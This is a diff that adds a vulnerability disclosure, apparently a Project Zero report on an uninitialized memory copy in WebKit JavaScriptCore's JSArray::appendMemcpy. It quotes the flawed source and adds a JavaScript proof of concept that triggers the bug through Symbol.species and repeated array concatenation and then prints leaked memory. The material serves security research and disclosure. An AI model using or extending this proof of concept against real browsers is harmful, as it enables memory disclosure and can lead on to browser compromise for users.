@@ -1,0 +1,74 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1236
+
+WebKit: JSC: JSArray::appendMemcpy uninitialized memory copy
+
+Here's a snippet of JSArray::appendMemcpy.
+
+bool JSArray::appendMemcpy(ExecState* exec, VM& vm, unsigned startIndex, JSC::JSArray* otherArray)
+{
+    auto scope = DECLARE_THROW_SCOPE(vm);
+
+    if (!canFastCopy(vm, otherArray))
+        return false;
+
+    IndexingType type = indexingType();
+    IndexingType copyType = mergeIndexingTypeForCopying(otherArray->indexingType());
+    if (type == ArrayWithUndecided && copyType != NonArray) {
+        if (copyType == ArrayWithInt32)
+            convertUndecidedToInt32(vm);
+        else if (copyType == ArrayWithDouble)
+            convertUndecidedToDouble(vm);
+        else if (copyType == ArrayWithContiguous)
+            convertUndecidedToContiguous(vm);
+        else {
+            ASSERT(copyType == ArrayWithUndecided);
+            return true;
+        }
+    } else if (type != copyType)
+        return false;
+
+    ...
+
+    if (type == ArrayWithDouble)
+        memcpy(butterfly()->contiguousDouble().data() + startIndex, otherArray->butterfly()->contiguousDouble().data(), sizeof(JSValue) * otherLength);
+    else
+        memcpy(butterfly()->contiguous().data() + startIndex, otherArray->butterfly()->contiguous().data(), sizeof(JSValue) * otherLength);
+
+    return true;
+}
+
+The method considers the case where |this|'s type is ArrayWithUndecided, but does not consider whether |otherArray|'s type is ArrayWithUndecided that may have uninitialized data.
+So, when the memcpy function is called, |otherArray|'s uninitialized memory may be copied to |this| which has a type.
+
+PoC:
+-->
+
+function optNewArrayAndConcat() {
+    let a = [,,,,,,,,,];
+    return Array.prototype.concat.apply(a);
+}
+
+function main() {
+    Array.prototype.constructor = {
+        [Symbol.species]: function () {
+            return [{}];
+        }
+    };
+
+    gc();
+
+    for (let i = 0; i < 0x10000; i++) {
+        optNewArrayAndConcat().fill({});
+    }
+
+    gc();
+
+    for (let i = 0; i < 0x20000; i++) {
+        let res = optNewArrayAndConcat();
+        if (res[0])
+            print(res.toString());
+    }
+}
+
+main();
